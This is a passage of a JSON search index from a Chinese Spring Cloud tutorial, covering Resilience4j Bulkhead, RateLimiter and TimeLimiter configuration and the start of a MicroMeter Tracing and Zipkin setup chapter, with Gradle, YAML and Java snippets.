\u662f\u4e00\u79cd\u5171\u4eab\u9501\uff0c\u53ef\u4ee5\u88ab\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u83b7\u53d6\uff0c\u4f46\u662f\u6570\u91cf\u6709\u9650\u3002 ThreadPool \u6a21\u5f0f\u4e2d\uff0c\u4f1a\u6709\u4e00\u4e2a\u7ebf\u7a0b\u6c60\u6765\u9650\u5236\u5e76\u53d1\u8bf7\u6c42\u7684\u6570\u91cf\uff0c\u5f53\u8bf7\u6c42\u5230\u8fbe\u65f6\uff0c\u4f1a\u5148\u5c1d\u8bd5\u63d0\u4ea4\u5230\u7ebf\u7a0b\u6c60\uff0c\u5982\u679c\u7ebf\u7a0b\u6c60\u5df2\u6ee1\uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002 Bulkhead \u4fe1\u53f7\u91cf\u6a21\u5f0f\u4f7f\u7528 \u5148\u5f15\u5165\u4f9d\u8d56\uff1a implementation 'io.github.resilience4j:resilience4j-bulkhead:2.2.0' \u7136\u540e\u914d\u7f6e\u5373\u53ef\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528 bean \u7684\u65b9\u6cd5\u3002 resilience4j: bulkhead: configs: default: max-concurrent-calls: 2 max-wait-duration: 1s instances: bh: base-config: default \u8fd9\u91cc\u7684\u8bbe\u7f6e\u548c\u4e4b\u524d\u7684 CircuitBreaker \u7c7b\u4f3c\uff0cmax-concurrent-calls \u662f\u6700\u5927\u5e76\u53d1\u8bf7\u6c42\u6570\uff0cmax-wait-duration \u662f\u6700\u5927\u7b49\u5f85\u65f6\u95f4\u3002 \u73b0\u5728\uff0c\u6211\u4eec\u4e3a API \u6dfb\u52a0\u4e00\u4e2a Bulkhead \u9650\u6d41\u5668\uff1a @GetMapping @CircuitBreaker(name = \"bk\", fallbackMethod = \"fb\") @Bulkhead(name = \"bh\", fallbackMethod = \"fb\") public ResponseWrapper<List<PaymentRecord>> getAllPayments() { return paymentAPIIf.getAllPayments(); } \u8fd9\u4e5f\u548c\u4e4b\u524d\u7684 CircuitBreaker \u7c7b\u4f3c\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e2a @Bulkhead \u6ce8\u89e3\u3002\u5f53\u5e76\u53d1\u8bf7\u6c42\u6570\u8d85\u8fc7 2 \u65f6\uff0c\u4f1a\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002 \u4e3a\u4e86\u6d4b\u8bd5\uff0c\u6211\u4eec\u624b\u52a8\u6dfb\u52a0\u4e00\u4e2a\u5ef6\u65f6\uff1a @GetMapping @CircuitBreaker(name = \"bk\", fallbackMethod = \"fb\") @Bulkhead(name = \"bh\", fallbackMethod = \"fb\") public ResponseWrapper<List<PaymentRecord>> getAllPayments() { try { Thread.sleep(5000); } catch (InterruptedException e) { e.printStackTrace(); } return paymentAPIIf.getAllPayments(); } \u7136\u540e\uff0c\u6211\u4eec\u7528\u6d4f\u89c8\u5668\u6253\u5f00\u591a\u4e2a\u7f51\u9875\uff0c\u540c\u65f6\u8bbf\u95ee\u8fd9\u4e2a API\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u5f53\u5e76\u53d1\u8bf7\u6c42\u6570\u8d85\u8fc7 2 \u65f6\uff0c\u4f1a\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002 Bulkhead \u7ebf\u7a0b\u6c60\u6a21\u5f0f\u4f7f\u7528 \u4e0e\u4fe1\u53f7\u91cf\u6a21\u5f0f\u4e0d\u540c\uff0c\u6b64\u65f6\u9700\u8981 API \u8fd4\u56de\u4e00\u4e2a CompletableFuture \u5bf9\u8c61\uff0c\u7136\u540e\u5728 CompletableFuture \u5bf9\u8c61\u4e2d\u6267\u884c\u4e1a\u52a1\u903b\u8f91\u3002\u8fd9\u6837\uff0c\u4e1a\u52a1\u903b\u8f91\u4f1a\u5728\u4e00\u4e2a\u7ebf\u7a0b\u6c60\u4e2d\u6267\u884c\uff0c\u4ece\u800c\u9650\u5236\u5e76\u53d1\u8bf7\u6c42\u6570\u3002 \u914d\u7f6e\u65f6\uff0c\u9700\u8981\u6307\u5b9a\u7ebf\u7a0b\u6c60\u7684\u5927\u5c0f\uff1a resilience4j: bulkhead: configs: default: max-concurrent-calls: 2 max-wait-duration: 1s instances: bh: base-config: default thread-pool-bulkhead: max-thread-pool-size: 2 \u7136\u540e\uff0c\u6211\u4eec\u4fee\u6539 API \u4e3a\u7ebf\u7a0b\u6c60\u6a21\u5f0f\uff0c\u5e76\u6307\u5b9a Bulkhead \u4e3a\u7ebf\u7a0b\u6c60\u6a21\u5f0f\uff1a @GetMapping @CircuitBreaker(name = \"bk\", fallbackMethod = \"fb\") @Bulkhead(name = \"bh\", type = Bulkhead.Type.THREADPOOL, fallbackMethod = \"fb\") public CompletableFuture<ResponseWrapper<List<PaymentRecord>>> getAllPayments() { return CompletableFuture.supplyAsync(() -> paymentAPIIf.getAllPayments()); } \u6b64\u65f6 fallback \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u4e5f\u9700\u8981\u4fee\u6539\u4e3a CompletableFuture \u5bf9\u8c61\u3002 public CompletableFuture<ResponseWrapper<List<PaymentRecord>>> fb(Throwable t) { return CompletableFuture.completedFuture(ResponseWrapper.error()); } \u4e4b\u540e\u7684\u6548\u679c\u548c\u524d\u6587\u4e00\u81f4\u3002 RateLimiter \u539f\u7406 RateLimiter \u662f Resilience4j \u63d0\u4f9b\u7684\u9650\u6d41\u5668\uff0c\u5b83\u53ef\u4ee5\u9650\u5236\u8bf7\u6c42\u7684\u901f\u7387\uff0c\u907f\u514d\u670d\u52a1\u88ab\u8fc7\u591a\u8bf7\u6c42\u62d6\u57ae\u3002 \u6574\u4f53\u4e0a\u8bb2\uff0c\u5e38\u7528\u7684\u9650\u6d41\u7b97\u6cd5\u6709\u56db\u79cd\u3002 \u6f0f\u6876\u7b97\u6cd5\uff0c\u56fa\u5b9a\u5bb9\u91cf\u7684\u6f0f\u6876\uff0c\u8bf7\u6c42\u5148\u8fdb\u5165\u6f0f\u6876\uff0c\u7136\u540e\u4ee5\u56fa\u5b9a\u901f\u7387\u6d41\u51fa\uff0c\u5982\u679c\u6f0f\u6876\u5df2\u6ee1\uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002 \u4ee4\u724c\u6876\u7b97\u6cd5\uff0c\u56fa\u5b9a\u5bb9\u91cf\u7684\u4ee4\u724c\u6876\uff0c\u8bf7\u6c42\u5148\u83b7\u53d6\u4ee4\u724c\uff0c\u7136\u540e\u6267\u884c\uff0c\u5982\u679c\u4ee4\u724c\u6876\u4e3a\u7a7a\uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002\u4ee4\u724c\u7684\u6570\u76ee\u4f1a\u6309\u56fa\u5b9a\u901f\u7387\u589e\u52a0\u3002\u8fd9\u662f Spring Cloud \u7684\u9ed8\u8ba4\u9650\u6d41\u7b97\u6cd5\u3002 \u6eda\u52a8\u7a97\u53e3\u7b97\u6cd5\uff0c\u56fa\u5b9a\u7a97\u53e3\u5185\u7684\u8bf7\u6c42\u6570\u91cf\u4e0d\u80fd\u8d85\u8fc7\u9650\u5236\u3002\u5373\u6bcf\u4e2a\u4e0d\u76f8\u4e92\u91cd\u53e0\u7684\u7a97\u53e3\u5185\u7684\u8bf7\u6c42\u6570\u91cf\u4e0d\u80fd\u8d85\u8fc7\u9650\u5236\u3002 \u6ed1\u52a8\u7a97\u53e3\u7b97\u6cd5\uff0c\u56fa\u5b9a\u7a97\u53e3\u5185\u7684\u5e73\u5747\u8bf7\u6c42\u6570\u91cf\u4e0d\u80fd\u8d85\u8fc7\u9650\u5236\u3002\u5373\u6bcf\u4e2a\u5927\u5c0f\u56fa\u5b9a\u7684\u7a97\u53e3\u5185\u7684\u5e73\u5747\u8bf7\u6c42\u6570\u91cf\u4e0d\u80fd\u8d85\u8fc7\u9650\u5236\u3002 RateLimiter \u4f7f\u7528 \u9996\u5148\uff0c\u6dfb\u52a0\u4f9d\u8d56\uff0c implementation 'io.github.resilience4j:resilience4j-ratelimiter:2.2.0' \u7136\u540e\u6dfb\u52a0\u914d\u7f6e\uff0c ratelimiter: configs: default: timeout-duration: 2s limit-for-period: 1 instances: rl: base-config: default \u7136\u540e\u5728 API \u4e0a\u6dfb\u52a0 RateLimiter \u6ce8\u89e3\uff0c @GetMapping @CircuitBreaker(name = \"bk\", fallbackMethod = \"fb\") @RateLimiter(name = \"rl\", fallbackMethod = \"fb\") public ResponseWrapper<List<PaymentRecord>> getAllPayments() { return paymentAPIIf.getAllPayments(); } \u8fd9\u6837\uff0c\u5f53\u8bf7\u6c42\u901f\u7387\u8d85\u8fc7 2s \u4e00\u4e2a\u8bf7\u6c42\u65f6\uff0c\u4f1a\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002 TimeLimiter \u539f\u7406\u4e0e\u4f7f\u7528 TimeLimiter \u662f Resilience4j \u63d0\u4f9b\u7684\u9650\u65f6\u5668\uff0c\u5b83\u53ef\u4ee5\u9650\u5236\u8bf7\u6c42\u7684\u6267\u884c\u65f6\u95f4\uff0c\u907f\u514d\u670d\u52a1\u88ab\u8fc7\u591a\u8bf7\u6c42\u62d6\u57ae\u3002\u8fd9\u662f\u6700\u7b80\u5355\u7684\u9650\u6d41\u5668\uff0c\u53ea\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a\u8d85\u65f6\u65f6\u95f4\u5373\u53ef\u3002 \u9996\u5148\uff0c\u6dfb\u52a0\u4f9d\u8d56\uff0c implementation 'io.github.resilience4j:resilience4j-timelimiter:2.2.0' \u7136\u540e\u6dfb\u52a0\u914d\u7f6e\uff0c timelimiter: configs: default: timeout-duration: 2s instances: tl: base-config: default \u7136\u540e\u5728 API \u4e0a\u6dfb\u52a0 TimeLimiter \u6ce8\u89e3\uff0c @GetMapping @CircuitBreaker(name = \"bk\", fallbackMethod = \"fb\") @TimeLimiter(name = \"tl\", fallbackMethod = \"fb\") public ResponseWrapper<List<PaymentRecord>> getAllPayments() { return paymentAPIIf.getAllPayments(); } \u8fd9\u6837\uff0c\u5f53\u8bf7\u6c42\u6267\u884c\u65f6\u95f4\u8d85\u8fc7 2s \u65f6\uff0c\u4f1a\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002","title":"Resilience4j \u9650\u6d41"},{"location":"08/#spring-cloud-ch8-resilience4j-bulkhead-ratelimiter-timelimiter","text":"Bulkhead \u662f Resilience4j \u63d0\u4f9b\u7684\u9650\u6d41\u5668\uff0c\u5b83\u53ef\u4ee5\u9650\u5236\u5e76\u53d1\u8bf7\u6c42\u7684\u6570\u91cf\uff0c\u907f\u514d\u670d\u52a1\u88ab\u8fc7\u591a\u8bf7\u6c42\u62d6\u57ae\u3002Bulkhead \u6709\u4e24\u79cd\u6a21\u5f0f\uff1aSemaphore \u548c ThreadPool\u3002Semaphore \u662f\u901a\u8fc7\u4fe1\u53f7\u91cf\u6765\u9650\u5236\u5e76\u53d1\u8bf7\u6c42\u7684\u6570\u91cf\uff0cThreadPool \u662f\u901a\u8fc7\u7ebf\u7a0b\u6c60\u6765\u9650\u5236\u5e76\u53d1\u8bf7\u6c42\u7684\u6570\u91cf\u3002\u8fd9\u6837\u53ef\u4ee5\u9632\u6b62\u7531\u4e8e\u67d0\u4e00\u4e2a\u670d\u52a1\u7684\u54cd\u5e94\u65f6\u95f4\u8fc7\u957f\uff0c\u5bfc\u81f4\u7ebf\u7a0b\u6c60\u88ab\u5360\u6ee1\uff0c\u4ece\u800c\u5f71\u54cd\u5176\u4ed6\u670d\u52a1\u7684\u6b63\u5e38\u8fd0\u884c\u3002Bulkhead \u4e00\u8bcd\u539f\u610f\u5373\u8239\u8231\u9694\u677f\uff0c\u7528\u6765\u9632\u6b62\u8239\u8231\u5185\u7684\u6c34\u6cc4\u6f0f\u5230\u5176\u4ed6\u8239\u8231\u3002 \u4e0b\u9762\u6240\u6709\u7684\u8be6\u7ec6\u914d\u7f6e\u53ef\u67e5\u8be2 Resilience4j \u5b98\u65b9\u6587\u6863 Core Module \u90e8\u5206 \u3002","title":"Spring Cloud \u901f\u6210 Ch8 Resilience4j Bulkhead, RateLimiter, TimeLimiter \u9650\u6d41"},{"location":"08/#bulkhead","text":"Semaphore \u6a21\u5f0f\u4e2d\uff0c\u4f1a\u6709\u4e00\u4e2a\u4fe1\u53f7\u91cf\u6765\u9650\u5236\u5e76\u53d1\u8bf7\u6c42\u7684\u6570\u91cf\uff0c\u5f53\u8bf7\u6c42\u5230\u8fbe\u65f6\uff0c\u4f1a\u5148\u5c1d\u8bd5\u83b7\u53d6\u4fe1\u53f7\u91cf\uff0c\u5982\u679c\u83b7\u53d6\u6210\u529f\uff0c\u5219\u7ee7\u7eed\u6267\u884c\uff0c\u5426\u5219\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002\u7c7b\u6bd4\u4e8e\u9501\uff0cSemaphore \u662f\u4e00\u79cd\u5171\u4eab\u9501\uff0c\u53ef\u4ee5\u88ab\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u83b7\u53d6\uff0c\u4f46\u662f\u6570\u91cf\u6709\u9650\u3002 ThreadPool \u6a21\u5f0f\u4e2d\uff0c\u4f1a\u6709\u4e00\u4e2a\u7ebf\u7a0b\u6c60\u6765\u9650\u5236\u5e76\u53d1\u8bf7\u6c42\u7684\u6570\u91cf\uff0c\u5f53\u8bf7\u6c42\u5230\u8fbe\u65f6\uff0c\u4f1a\u5148\u5c1d\u8bd5\u63d0\u4ea4\u5230\u7ebf\u7a0b\u6c60\uff0c\u5982\u679c\u7ebf\u7a0b\u6c60\u5df2\u6ee1\uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002","title":"Bulkhead \u539f\u7406"},{"location":"08/#bulkhead_1","text":"\u5148\u5f15\u5165\u4f9d\u8d56\uff1a implementation 'io.github.resilience4j:resilience4j-bulkhead:2.2.0' \u7136\u540e\u914d\u7f6e\u5373\u53ef\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528 bean \u7684\u65b9\u6cd5\u3002 resilience4j: bulkhead: configs: default: max-concurrent-calls: 2 max-wait-duration: 1s instances: bh: base-config: default \u8fd9\u91cc\u7684\u8bbe\u7f6e\u548c\u4e4b\u524d\u7684 CircuitBreaker \u7c7b\u4f3c\uff0cmax-concurrent-calls \u662f\u6700\u5927\u5e76\u53d1\u8bf7\u6c42\u6570\uff0cmax-wait-duration \u662f\u6700\u5927\u7b49\u5f85\u65f6\u95f4\u3002 \u73b0\u5728\uff0c\u6211\u4eec\u4e3a API \u6dfb\u52a0\u4e00\u4e2a Bulkhead \u9650\u6d41\u5668\uff1a @GetMapping @CircuitBreaker(name = \"bk\", fallbackMethod = \"fb\") @Bulkhead(name = \"bh\", fallbackMethod = \"fb\") public ResponseWrapper<List<PaymentRecord>> getAllPayments() { return paymentAPIIf.getAllPayments(); } \u8fd9\u4e5f\u548c\u4e4b\u524d\u7684 CircuitBreaker \u7c7b\u4f3c\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e2a @Bulkhead \u6ce8\u89e3\u3002\u5f53\u5e76\u53d1\u8bf7\u6c42\u6570\u8d85\u8fc7 2 \u65f6\uff0c\u4f1a\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002 \u4e3a\u4e86\u6d4b\u8bd5\uff0c\u6211\u4eec\u624b\u52a8\u6dfb\u52a0\u4e00\u4e2a\u5ef6\u65f6\uff1a @GetMapping @CircuitBreaker(name = \"bk\", fallbackMethod = \"fb\") @Bulkhead(name = \"bh\", fallbackMethod = \"fb\") public ResponseWrapper<List<PaymentRecord>> getAllPayments() { try { Thread.sleep(5000); } catch (InterruptedException e) { e.printStackTrace(); } return paymentAPIIf.getAllPayments(); } \u7136\u540e\uff0c\u6211\u4eec\u7528\u6d4f\u89c8\u5668\u6253\u5f00\u591a\u4e2a\u7f51\u9875\uff0c\u540c\u65f6\u8bbf\u95ee\u8fd9\u4e2a API\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u5f53\u5e76\u53d1\u8bf7\u6c42\u6570\u8d85\u8fc7 2 \u65f6\uff0c\u4f1a\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002","title":"Bulkhead \u4fe1\u53f7\u91cf\u6a21\u5f0f\u4f7f\u7528"},{"location":"08/#bulkhead_2","text":"\u4e0e\u4fe1\u53f7\u91cf\u6a21\u5f0f\u4e0d\u540c\uff0c\u6b64\u65f6\u9700\u8981 API \u8fd4\u56de\u4e00\u4e2a CompletableFuture \u5bf9\u8c61\uff0c\u7136\u540e\u5728 CompletableFuture \u5bf9\u8c61\u4e2d\u6267\u884c\u4e1a\u52a1\u903b\u8f91\u3002\u8fd9\u6837\uff0c\u4e1a\u52a1\u903b\u8f91\u4f1a\u5728\u4e00\u4e2a\u7ebf\u7a0b\u6c60\u4e2d\u6267\u884c\uff0c\u4ece\u800c\u9650\u5236\u5e76\u53d1\u8bf7\u6c42\u6570\u3002 \u914d\u7f6e\u65f6\uff0c\u9700\u8981\u6307\u5b9a\u7ebf\u7a0b\u6c60\u7684\u5927\u5c0f\uff1a resilience4j: bulkhead: configs: default: max-concurrent-calls: 2 max-wait-duration: 1s instances: bh: base-config: default thread-pool-bulkhead: max-thread-pool-size: 2 \u7136\u540e\uff0c\u6211\u4eec\u4fee\u6539 API \u4e3a\u7ebf\u7a0b\u6c60\u6a21\u5f0f\uff0c\u5e76\u6307\u5b9a Bulkhead \u4e3a\u7ebf\u7a0b\u6c60\u6a21\u5f0f\uff1a @GetMapping @CircuitBreaker(name = \"bk\", fallbackMethod = \"fb\") @Bulkhead(name = \"bh\", type = Bulkhead.Type.THREADPOOL, fallbackMethod = \"fb\") public CompletableFuture<ResponseWrapper<List<PaymentRecord>>> getAllPayments() { return CompletableFuture.supplyAsync(() -> paymentAPIIf.getAllPayments()); } \u6b64\u65f6 fallback \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u4e5f\u9700\u8981\u4fee\u6539\u4e3a CompletableFuture \u5bf9\u8c61\u3002 public CompletableFuture<ResponseWrapper<List<PaymentRecord>>> fb(Throwable t) { return CompletableFuture.completedFuture(ResponseWrapper.error()); } \u4e4b\u540e\u7684\u6548\u679c\u548c\u524d\u6587\u4e00\u81f4\u3002","title":"Bulkhead \u7ebf\u7a0b\u6c60\u6a21\u5f0f\u4f7f\u7528"},{"location":"08/#ratelimiter","text":"RateLimiter \u662f Resilience4j \u63d0\u4f9b\u7684\u9650\u6d41\u5668\uff0c\u5b83\u53ef\u4ee5\u9650\u5236\u8bf7\u6c42\u7684\u901f\u7387\uff0c\u907f\u514d\u670d\u52a1\u88ab\u8fc7\u591a\u8bf7\u6c42\u62d6\u57ae\u3002 \u6574\u4f53\u4e0a\u8bb2\uff0c\u5e38\u7528\u7684\u9650\u6d41\u7b97\u6cd5\u6709\u56db\u79cd\u3002 \u6f0f\u6876\u7b97\u6cd5\uff0c\u56fa\u5b9a\u5bb9\u91cf\u7684\u6f0f\u6876\uff0c\u8bf7\u6c42\u5148\u8fdb\u5165\u6f0f\u6876\uff0c\u7136\u540e\u4ee5\u56fa\u5b9a\u901f\u7387\u6d41\u51fa\uff0c\u5982\u679c\u6f0f\u6876\u5df2\u6ee1\uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002 \u4ee4\u724c\u6876\u7b97\u6cd5\uff0c\u56fa\u5b9a\u5bb9\u91cf\u7684\u4ee4\u724c\u6876\uff0c\u8bf7\u6c42\u5148\u83b7\u53d6\u4ee4\u724c\uff0c\u7136\u540e\u6267\u884c\uff0c\u5982\u679c\u4ee4\u724c\u6876\u4e3a\u7a7a\uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002\u4ee4\u724c\u7684\u6570\u76ee\u4f1a\u6309\u56fa\u5b9a\u901f\u7387\u589e\u52a0\u3002\u8fd9\u662f Spring Cloud \u7684\u9ed8\u8ba4\u9650\u6d41\u7b97\u6cd5\u3002 \u6eda\u52a8\u7a97\u53e3\u7b97\u6cd5\uff0c\u56fa\u5b9a\u7a97\u53e3\u5185\u7684\u8bf7\u6c42\u6570\u91cf\u4e0d\u80fd\u8d85\u8fc7\u9650\u5236\u3002\u5373\u6bcf\u4e2a\u4e0d\u76f8\u4e92\u91cd\u53e0\u7684\u7a97\u53e3\u5185\u7684\u8bf7\u6c42\u6570\u91cf\u4e0d\u80fd\u8d85\u8fc7\u9650\u5236\u3002 \u6ed1\u52a8\u7a97\u53e3\u7b97\u6cd5\uff0c\u56fa\u5b9a\u7a97\u53e3\u5185\u7684\u5e73\u5747\u8bf7\u6c42\u6570\u91cf\u4e0d\u80fd\u8d85\u8fc7\u9650\u5236\u3002\u5373\u6bcf\u4e2a\u5927\u5c0f\u56fa\u5b9a\u7684\u7a97\u53e3\u5185\u7684\u5e73\u5747\u8bf7\u6c42\u6570\u91cf\u4e0d\u80fd\u8d85\u8fc7\u9650\u5236\u3002","title":"RateLimiter \u539f\u7406"},{"location":"08/#ratelimiter_1","text":"\u9996\u5148\uff0c\u6dfb\u52a0\u4f9d\u8d56\uff0c implementation 'io.github.resilience4j:resilience4j-ratelimiter:2.2.0' \u7136\u540e\u6dfb\u52a0\u914d\u7f6e\uff0c ratelimiter: configs: default: timeout-duration: 2s limit-for-period: 1 instances: rl: base-config: default \u7136\u540e\u5728 API \u4e0a\u6dfb\u52a0 RateLimiter \u6ce8\u89e3\uff0c @GetMapping @CircuitBreaker(name = \"bk\", fallbackMethod = \"fb\") @RateLimiter(name = \"rl\", fallbackMethod = \"fb\") public ResponseWrapper<List<PaymentRecord>> getAllPayments() { return paymentAPIIf.getAllPayments(); } \u8fd9\u6837\uff0c\u5f53\u8bf7\u6c42\u901f\u7387\u8d85\u8fc7 2s \u4e00\u4e2a\u8bf7\u6c42\u65f6\uff0c\u4f1a\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002","title":"RateLimiter \u4f7f\u7528"},{"location":"08/#timelimiter","text":"TimeLimiter \u662f Resilience4j \u63d0\u4f9b\u7684\u9650\u65f6\u5668\uff0c\u5b83\u53ef\u4ee5\u9650\u5236\u8bf7\u6c42\u7684\u6267\u884c\u65f6\u95f4\uff0c\u907f\u514d\u670d\u52a1\u88ab\u8fc7\u591a\u8bf7\u6c42\u62d6\u57ae\u3002\u8fd9\u662f\u6700\u7b80\u5355\u7684\u9650\u6d41\u5668\uff0c\u53ea\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a\u8d85\u65f6\u65f6\u95f4\u5373\u53ef\u3002 \u9996\u5148\uff0c\u6dfb\u52a0\u4f9d\u8d56\uff0c implementation 'io.github.resilience4j:resilience4j-timelimiter:2.2.0' \u7136\u540e\u6dfb\u52a0\u914d\u7f6e\uff0c timelimiter: configs: default: timeout-duration: 2s instances: tl: base-config: default \u7136\u540e\u5728 API \u4e0a\u6dfb\u52a0 TimeLimiter \u6ce8\u89e3\uff0c @GetMapping @CircuitBreaker(name = \"bk\", fallbackMethod = \"fb\") @TimeLimiter(name = \"tl\", fallbackMethod = \"fb\") public ResponseWrapper<List<PaymentRecord>> getAllPayments() { return paymentAPIIf.getAllPayments(); } \u8fd9\u6837\uff0c\u5f53\u8bf7\u6c42\u6267\u884c\u65f6\u95f4\u8d85\u8fc7 2s \u65f6\uff0c\u4f1a\u76f4\u63a5\u8fd4\u56de\u5931\u8d25\u3002","title":"TimeLimiter \u539f\u7406\u4e0e\u4f7f\u7528"},{"location":"09/","text":"Spring Cloud \u901f\u6210 Ch9 MicroMeter Tracing \u670d\u52a1\u94fe\u8def\u8ffd\u8e2a MicroMeter Tracing \u662f\u5ea6\u91cf\u76d1\u63a7\u6846\u67b6\uff0c\u5b83\u53ef\u4ee5\u7528\u4e8e\u76d1\u63a7\u5e94\u7528\u7684\u6027\u80fd\u6307\u6807\u3002\u5728 Spring Cloud \u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 MicroMeter Tracing \u6765\u76d1\u63a7\u670d\u52a1\u7684\u6027\u80fd\u6307\u6807\uff0c\u6bd4\u5982\u8bf7\u6c42\u7684\u54cd\u5e94\u65f6\u95f4\u3001\u8bf7\u6c42\u7684\u6210\u529f\u7387\u7b49\u3002\u5e76\u67e5\u770b\u6574\u4e2a\u5fae\u670d\u52a1\u7cfb\u7edf\u7684\u94fe\u8def\uff0c\u65b9\u4fbf\u6392\u67e5\u95ee\u9898\u3002 MicroMeter Tracing \u6536\u96c6\u7684\u6570\u636e\u53ef\u4ee5\u901a\u8fc7 ZipKin \u6765\u53ef\u89c6\u5316\u5c55\u793a\u3002 \u542f\u52a8 ZipKin \u5411 compose \u6587\u4ef6\u6dfb\u52a0\uff0c zipkin: image: openzipkin/zipkin ports: - 9411:9411 \u53ea\u8f6c\u53d1 9411 \u7aef\u53e3\u5373\u53ef\uff0c\u7136\u540e\u542f\u52a8 docker\uff0c\u8bbf\u95ee 9411 \u7aef\u53e3\u5373\u53ef\u3002 \u914d\u7f6e MicroMeter Tracing \u6839\u636e \u5b98\u65b9\u6587\u6863 \uff0c\u9996\u5148\u8981\u5f15\u5165\u4f9d\u8d56\uff0c implementation platform('io.micrometer:micrometer-tracing-bom:latest.release') platform \u7684\u529f\u80fd\u548c dependencyManagement \u7c7b\u4f3c\uff0c\u53ef\u4ee5\u7edf\u4e00\u7ba1\u7406\u4f9d\u8d56\u7684\u7248\u672c\u3002 implementation 'io.micrometer:micrometer-tracing' \u6ce8\u610f\uff0cMicrometer \u672c\u8eab\u662f\u53ea\u662f\u4e00\u4e2a\u8ffd\u8e2a\u6846\u67b6\uff0c\u9700\u8981\u914d\u5408\u5177\u4f53\u7684\u5b9e\u73b0\u6765\u4f7f\u7528\uff0c\u6bd4\u5982 Brave\uff0c\u4f5c\u4e3a\u5206\u5e03\u5f0f\u8ffd\u8e2a\u7684\u5b9e\u73b0\uff0c\u4ee5\u53ca Observer\uff0c\u4f5c\u4e3a\u6027\u80fd\u76d1\u63a7\u7684\u5b9e\u73b0\u3002 implementation 'io.micrometer:micrometer-tracing-bridge-brave' implementation 'io.micrometer:micrometer-observation' \u7136\u540e\u9700\u8981\u4e00\u4e2a Reporter\uff0c\u628a\u6570\u636e\u53d1\u9001\u5230 ZipKin\uff0c implementation 'io.zipkin.reporter2:zipkin-reporter-brave' \u5982\u679c\u662f\u7528\u7684 Spring Interface Client\uff0c\u9ed8\u8ba4\u6709\u4e00\u4e2a WebClient \u7684\u8ffd\u8e2a\u5668\uff0c\u53c2\u89c1 \u6587\u6863 \u3002\u5982\u679c\u4f7f\u7528 OpenFeign\uff0c\u8fd8\u8981\u5f15\u5165 OpenFeign \u7684\u8ffd\u8e2a\u5668\uff0c implementation 'io.github.openfeign:feign-micrometer:13.3' \u8fd9\u4e9b\u5e94\u8be5\u5f15\u5165\u5230\u9700\u8981\u8ffd\u8e2a\u7684\u670d\u52a1\u4e2d\u3002\u8fd9\u91cc\u6211\u4eec\u5e0c\u671b\u8ffd\u8e2a\u6240\u6709\u670d\u52a1\uff0c\u6240\u4ee5\u5728 allprojects \u4e2d\u5f15\u5165\u3002 \u5982\u679c\u4f7f\u7528\u9ed8\u8ba4\u7684 WebClient Builder\uff0c\u5373\u4e0d\u81ea\u5b9a\u4e49 WebClient Builder\uff0c\u90a3\u4e48\u5c31\u4e0d\u9700\u8981\u989d\u5916\u914d\u7f6e\uff0c\u56e0\u4e3a\u9ed8\u8ba4\u7684 WebClient Builder \u5df2\u7ecf\u96c6\u6210\u4e86\u8ffd\u8e2a\u5668\u3002 \u4f46\u662f\uff0c\u56e0\u4e3a\u6211\u4eec\u4e4b\u524d\u66f4\u6539\u4e86 WebClient Builder\uff0c\u6240\u4ee5\u9700\u8981\u624b\u52a8\u6dfb\u52a0\u8ffd\u8e2a\u5668\uff0c\u53c2\u8003 \u6587\u6863 \u5982\u679c\u7528 OpenFeign\uff0c\u4e0d\u7528\u505a\u8fd9\u4e00\u6b65\u3002 @Bean @LoadBalanced WebClient.Builder webClientBuilder( @Autowired ObservationWebClientCustomizer observationWebClientCustomizer ) { HttpAsyncClientBuilder clientBuilder = HttpAsyncClients.custom(); clientBuilder.setDefaultRequestConfig(RequestConfig.custom().build()); CloseableHttpAsyncClient client = clientBuilder.build(); ClientHttpConnector connector = new HttpComponentsClientHttpConnector(client); WebClient.Builder builder = WebClient.builder(); observationWebClientCustomizer.customize(builder); return builder.clientConnector(connector); } \u7136\u540e\u4fee\u6539\u9700\u8981\u8ffd\u8e2a\u7684\u670d\u52a1\u7684\u914d\u7f6e\uff0c management: zipkin: tracing: endpoint: http://localhost:9411/api/v2/spans tracing: sampling: probability: 1.0 \u8fd9\u6837\uff0c\u5c31\u53ef\u4ee5\u5728 ZipKin \u4e2d\u770b\u5230\u670d\u52a1\u7684\u94fe\u8def\u4e86\u3002\u542f\u52a8\u4e24\u4e2a\u670d\u52a1\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u5065\u5eb7\u68c0\u67e5\u7684\u4fe1\u606f\uff0c \u518d\u4efb\u610f\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42\uff0c\u53ef\u4ee5\u770b\u5230\u65b0\u7684\u94fe\u8def\u4fe1\u606f\uff0c \u70b9\u51fb Show \u53ef\u4ee5\u770b\u5230\u8be6\u7ec6\u7684\u94fe\u8def\u4fe1\u606f\uff0c 